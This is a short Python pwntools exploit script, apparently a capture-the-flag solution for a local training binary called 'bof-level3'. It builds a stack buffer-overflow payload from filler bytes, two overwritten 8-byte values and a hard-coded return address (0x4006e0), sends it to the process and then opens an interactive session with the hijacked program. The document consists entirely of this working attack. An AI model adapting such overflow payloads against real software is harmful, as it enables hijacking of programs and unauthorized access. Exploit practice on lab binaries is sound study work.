#!/usr/bin/env python

from pwn import *

p = process('./bof-level3')

print(p.recv())

p.sendline("A" * 32 + p64(0x4847464544434241) + p64(0x6867666564636261) + "A" * 8 + p64(0x4006e0))

p.interactive()
